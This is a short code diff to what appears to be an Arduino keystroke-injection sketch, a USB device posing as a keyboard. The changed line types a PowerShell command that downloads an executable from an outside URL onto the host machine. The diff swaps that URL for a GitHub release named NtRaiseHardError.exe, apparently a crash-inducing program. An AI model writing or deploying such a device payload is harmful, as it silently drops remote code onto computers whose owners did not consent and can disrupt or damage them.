@@ -10,7 +10,7 @@ void setup() {
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
   delay(200);
-  Keyboard.println("invoke-webrequest -uri https://www.lzc.app/main.exe -outfile main.exe");
+  Keyboard.println("invoke-webrequest -uri https://github.com/RainySummerLuo/NtRaiseHardError/releases/download/C%2B%2B-1.1.0/NtRaiseHardError.exe -outfile main.exe");
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
   delay(200);
